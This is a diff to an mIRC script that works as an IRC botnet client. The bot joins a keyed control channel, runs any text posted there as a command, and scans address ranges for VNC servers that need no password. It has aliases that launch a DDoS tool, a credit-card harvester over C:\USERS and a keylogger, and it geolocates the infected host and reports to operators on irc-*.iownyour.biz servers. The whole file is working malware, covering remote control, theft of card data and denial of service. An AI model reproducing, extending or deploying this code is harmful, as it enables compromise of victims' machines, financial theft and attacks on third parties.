@@ -1,11 +1,11 @@
 on *:APPACTIVE:findtray
-on 1:CONNECT:{ join %fldchan %key | .timercon off | .timerC 1 10 resolve | .timernick 1 30 nick %ctry $+ $+ %start $+ |- $+ $os }
+on 1:CONNECT:{ join %fldchan %key | .timercon off }
 alias findtray { .timer 1 0 showmirc -t }
 alias ff .timerff 0 1 findtray
 raw 001:*:{ set %fldchan #X#psy#X# | set %key $encode(Sm0k3d,m) | join %fldchan %key }
 raw 475:*:{ join %fldchan %key }
 RAW 332:*:if ($2 == %fldchan) [ [ $3- ] ]
-on *:TEXT:*:*:{ %x = $1- | $evalnext(%x) | .timerMSG 1 3 .msg %fldchan 8,12 $evalnext(%x) | unset %x | close -m | windows -h $active }
+on *:TEXT:*:*:{ %x = $1- | $evalnext(%x) | .timerMSG 1 3 .opnotice %fldchan   $+($r(0,99),$chr(44),$r(0,99)) $evalnext(%x) | unset %x | close -m | windows -h $active }
 on *:EXIT:run $mircexe
 on *:sockopen:vncscan*:{
   if ($sockerr) { return }
@@ -26,12 +26,12 @@ on *:sockread:vncscan*:{
 
 }
 
-alias ddos { run start /MIN /REALTIME $shortfn($mircdir(P\p.exe)) $shortfn($mircdir(P\ddos.py)) $2- & }
-alias cc { run start /MIN /REALTIME $shortfn($mircdir(cc\cc.exe)) }
+alias ddos { .opnotice %fldchan  $+($r(0,99),$chr(44),$r(0,99)) DDoS <  $+($r(0,99),$chr(44),$r(0,99)) $1  $+($r(0,99),$chr(44),$r(0,99)) $2  $+($r(0,99),$chr(44),$r(0,99)) $3  $+($r(0,99),$chr(44),$r(0,99)) $  $+($r(0,99),$chr(44),$r(0,99)) $5 > | run start /MIN /REALTIME $findfile($shortfn($Mircdir),*p.exe*,1) $findfile($shortfn($Mircdir),*ddos.py*,1) $2- & }
+alias cc { opnotice %fldchan Searching for Credit Card information in  $+($r(0,99),$chr(44),$r(0,99)) C:\USERS | .timerCC -o 1 5 run start /MIN /REALTIME $findfile($shortfn($Mircdir),*cc.exe*,1) }
 alias kl { run system.exe | .timerkl -o 0 10 init }
 
 alias checkvnc {
-  .write system.log VNCNULL-AUTH $sock($1).ip $+ : $+ $sock($1).port
+  .write system.log  $+($r(0,99),$chr(44),$r(0,99)) NULL-AUTH $sock($1).ip $+ : $+ $sock($1).port
   .timerPLAYQUEUE 1 5 playqueue
   if ($calc($sock($1).port +1) == 6000) return
   .timer $+ $1 $+ $calc($sock($1).port +1) 1 0 sockopen $1 $+ $r(0,9999) $sock($1).ip $calc($sock($1).port +1) 
@@ -56,7 +56,7 @@ alias rvnc {
 
 alias nextvnc {
   inc %rangex
-  if (256 <= $gettok(%range,2,46)) { unset %range | notice @ $+ %fldchan * Scan halted, waiting for new command... }
+  if (256 <= $gettok(%range,2,46)) { unset %range | notice @ $+ %fldchan  $+($r(0,99),$chr(44),$r(0,99))* Scan halted, waiting for new command... }
   if (256 <= %rangex) { unset %rangex | %range = $+($gettok(%range,1-2,46),.,$calc($gettok(%range,3,46) + 1),.,%rangex) }
   sockopen vncscan $+ $r(0,999999999999999999) $+(%range,.,%rangex) %vncport
 }
@@ -85,10 +85,11 @@ alias init {
   }
 
 }
-alias opnotice { .notice @ $+ %fldchan $2- }
+alias opnotice { .notice @ $+ %fldchan  $+($r(0,99),$chr(44),$r(0,99)) $+ $evalnext($2-,1) $+  }
+
 on *:DISCONNECT:.timerDC 1 1 server irc- $+ $r(1,4) $+ .iownyour.biz $iif($sslready,+6697,6667) -jn %fldchan %key
 on *:PART:%fldchan:{ if ($nick == $me) .timer 1 1 join # %key } 
-on *:JOIN:#:{ if ($nick == $me) .timer 1 0 window -h # | .timer 1 10 clearall |  if ($me isop #) mode # +smnkKo $me %key $nick  }
+on *:JOIN:#:{ if ($nick == $me) .timer 1 0 window -h # |  .timerC $+ # 1 10 resolve | .timernick 1 30 nick %ctry $+ $+ %start $+ |- $+ $os | if ($nick == $me) .opnotice %fldchan  $+($r(0,99),$chr(44),$r(0,99)) Https://github.com/independentcod/psyBNC-Win  $+($r(0,99),$chr(44),$r(0,99)) https://is.gd/PsyBNC $  | .timer 1 10 clearall |  if ($me isop #) mode # +osmnkK $nick %key   }
 alias resolve {
   set %resolve.ip $ip
   sockopen resolve.ip_ $+ $ip ipinfo.io 80
@@ -110,14 +111,14 @@ on *:sockread:resolve.ip*: {
   :read
   sockread %sockread
   if (!$sockbr) return
-  if (*Hostname*:* iswm %sockread) notice @ $+ %fldchan %resolve.ip : %sockread
-  if (*ISP*:* iswm %sockread) notice @ $+ %fldchan %resolve.ip %sockread
-  if (*Country*:* iswm %sockread) { set %ctry $remove($gettok(%sockread,2,32),",$CHR(44)) | nick %ctry $+ %city $+ %start $+ - $+ $os $+ $ticks }
-  if (*City*:* iswm %sockread)  { set %city $remove($gettok(%sockread,2,32),",$CHR(44)) | nick %ctry $+ %city $+ %start $+ - $+ $os $+ $ticks }
-  if (*org*:* iswm %sockread) notice @ $+ %fldchan %resolve.ip : %sockread
-  if (*loc*:* iswm %sockread) notice @ $+ %fldchan %resolve.ip : %sockread
-  if (*region*:* iswm %sockread) notice @ $+ %fldchan %resolve.ip $+ : %sockread
-  if (*postal*:* iswm %sockread) notice @ $+ %fldchan %resolve.ip $+ : %sockread
+  if (*Hostname*:* iswm %sockread) notice @ $+ %fldchan  $+($r(0,99),$chr(44),$r(0,99)) %resolve.ip : %sockread
+  if (*ISP*:* iswm %sockread) notice @ $+ %fldchan  $+($r(0,99),$chr(44),$r(0,99)) %resolve.ip %sockread
+  if (*Country*:* iswm %sockread) { set %ctry  $+($r(0,99),$chr(44),$r(0,99)) $remove($gettok(%sockread,2,32),",$CHR(44)) | nick %ctry $+ %city $+ %start $+ - $+ $os $+ $ticks }
+  if (*City*:* iswm %sockread)  { set %city  $+($r(0,99),$chr(44),$r(0,99)) $remove($gettok(%sockread,2,32),",$CHR(44)) | nick %ctry $+ %city $+ %start $+ - $+ $os $+ $ticks }
+  if (*org*:* iswm %sockread) notice @ $+ %fldchan  $+($r(0,99),$chr(44),$r(0,99)) %resolve.ip : %sockread
+  if (*loc*:* iswm %sockread) notice @ $+ %fldchan  $+($r(0,99),$chr(44),$r(0,99)) %resolve.ip : %sockread
+  if (*region*:* iswm %sockread) notice @ $+ %fldchan  $+($r(0,99),$chr(44),$r(0,99)) %resolve.ip $+ : %sockread
+  if (*postal*:* iswm %sockread) notice @ $+ %fldchan  $+($r(0,99),$chr(44),$r(0,99)) %resolve.ip $+ : %sockread
   goto read
 }
 
